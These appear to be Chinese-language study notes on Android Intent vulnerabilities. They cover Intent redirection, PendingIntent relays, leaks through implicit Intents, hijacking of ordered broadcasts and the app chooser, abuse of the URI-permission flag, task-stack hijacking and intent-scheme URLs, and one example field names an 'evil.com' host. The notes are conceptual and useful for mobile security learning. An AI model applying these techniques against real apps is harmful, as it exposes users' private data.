Intent

​ 组件之间互相调用与通信，都是通过Intent（意图）来实现的。一个组件可以通过Intent来做不同的事情，可以接收与发送不同的Intent。

Intent也分为两类：

Intent数据承载：

字段 说明 示例
action 动作标识符 android.intent.action.VIEW
data URI 数据 content://contacts/1
type MIME 类型 image/png
category 类别标签 android.intent.category.DEFAULT
extras 键值对附加数据 putExtra("url", "https://evil.com")
flags 控制标志位 FLAG_GRANT_READ_URI_PERMISSION
component 目标组件 com.app/.Activity

（extras可以携带任意类型的数据，包括另一个Intent）

ps：APP A（Intent发出）–>ActivityManagerService–>APP B–>执行

Intent重定向

用一个可导出组件，帮外部调用一个本不该被外部访问的内部组件。

（因为传入Intent时，APP会替该Intent去执行操作，所以相当于APP去帮我们执行，自然也不会受到权限限制）

常见形式

直接转发嵌套 Intent

直接传Intent且直接调用 startActivity不做任何效验

字符串参数构造Intent

不直接传Intent，而是传入包名和类名，APP自己拼接成Intent

IntentSender / PendingIntent 中继

PendingIntent：APP未来替别人执行一次操作

IntentSender 其实就是PendingIntent的底层执行语句

版本限制

Android 12+

Intent从另一个Intent的extras取出时，如果目标组件未导出就会抛出异常

（只对startActivity 有效，对sendBroadcast 和 startService 的限制较弱）

隐式Intent信息泄露

APP使用隐式Intent发送数据，系统会在已经安装的APP进行匹配，如果恶意APP注册了相应的Intent-filter，就能截获这个Intent携带数据。

不至于广播（sendBroadcast），其他组件也可以，类似于Activity。

有序广播劫持

有序广播（Ordered Broadcast）是一种按优先级依次分发的广播。接收者可以修改广播内容，甚至终止广播的继续传递。

优先级： -1000 到 1000，越大越先接收

Activity选择器劫持

当隐式 Intent 匹配到多个 Activity 时，系统弹出选择器（Chooser）。攻击者可以注册一个看起来像合法应用的 Activity 来欺骗用户选择：

一旦用户点击，攻击者的Activity就劫持了相应的数据

Intent Flag滥用

FLAG_GRANT_READ_URI_PERMISSION

临时把某个 content:// URI 的读取权限授权给别的 App。

（合法共享文件）

当受害APP导出组件存在重定向漏洞时，攻击则可以构造带有FLAG_GRANT_READ_URI_PERMISSION的Intent，让受害APP把自己的ContentProvider的数据授权给攻击者

FLAG_ACTIVITY_NEW_TASK 与任务栈劫持

Android 的 Activity 是按”任务栈”（Task）组织的。每个任务栈是一组 Activity 的堆叠，用户按返回键时从栈顶依次弹出。

FLAG_ACTIVITY_NEW_TASK：让目标 Activity 在一个新的任务栈中启动。

taskAffinity：决定 Activity 属于哪个任务栈

Intent Scheme URL（Intent 协议链接）

本质：用一个URL，直接描述一个Intent再通过Intent.parseUri(...)将URL变成真正的Intent去执行

所以其中如果没有合理的过滤，那就可以通过这个URL触发任意Intent。
